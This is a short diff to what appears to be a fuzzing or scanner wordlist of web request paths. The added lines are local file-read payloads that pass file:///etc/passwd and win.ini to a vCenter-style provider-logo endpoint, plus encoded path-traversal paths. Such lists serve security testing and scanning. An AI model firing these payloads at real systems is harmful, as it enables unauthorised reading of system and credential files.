@@ -751,3 +751,8 @@
 /signalk/v2/api/resources/routes/..%2F..%2F..%2F..%2Fpackage.json
 /%5B:local:/etc%5D/passwd
 /graph_image.php?local_graph_id=1&rra_id=0&show_source=1&graph_theme=midwinter/.
+/ui/vcav-bootstrap/rest/vcav-providers/provider-logo?url=file%3a///etc/passwd
+/ui/vcav-bootstrap/rest/vcav-providers/provider-logo?url=file%3a///c%3a/windows/win.ini
+/vsphere-client/vcav-bootstrap/rest/vcav-providers/provider-logo?url=file%3a///etc/passwd
+/vsphere-client/vcav-bootstrap/rest/vcav-providers/provider-logo?url=file%3a///c%3a/windows/win.ini
+/assets/images/%2e%2e/%2e%2e/vendor/symfony/error-handler/Resources/assets/images/symfony-logo.svg
